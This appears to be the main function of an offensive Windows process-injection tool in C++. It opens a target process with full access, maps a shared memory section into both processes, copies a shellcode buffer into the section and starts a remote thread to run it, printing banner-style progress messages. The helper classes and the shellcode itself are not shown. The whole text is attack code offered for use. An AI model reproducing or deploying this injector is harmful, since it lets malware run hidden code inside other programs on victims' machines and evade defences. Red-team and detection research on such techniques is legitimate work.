int main(int argc, char** argv) {
	SIZE_T size = sizeof(buf);
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL;
	PVOID remoteSectionAddress = NULL;
	PrintBanner();

	if (argc < 2) {
		std::cout << "[!] Incorrect number of arguments passed in." << std::endl;
		std::cout << "Usage: " << argv[0] << " <application>.exe" << std::endl;
	}
	ProcHelper* processHelper = new ProcHelper(argv[1]);
	ntdll* nt = new ntdll();

	std::cout << "[>] Mapping local section" << std::endl;
	Injector::MapLocalSection(sectionHandle, nt, localSectionAddress, size);

	std::cout << "[>] Mapping remote section" << std::endl;
	// create a view of the memory section in the target process
	HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, processHelper->procID);
	Injector::MapRemoteSection(sectionHandle, targetHandle, nt, remoteSectionAddress, size);

	std::cout << "[>] Copying shellcode to target process" << std::endl;
	// copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, buf, sizeof(buf));

	std::cout << "[>] Starting thread in process: " << processHelper->procName << std::endl;
	Injector::StartThread(targetHandle, remoteSectionAddress, nt);

	std::cout << "[+] Injected successfully into: " << processHelper->procName << std::endl;
	return 0;
}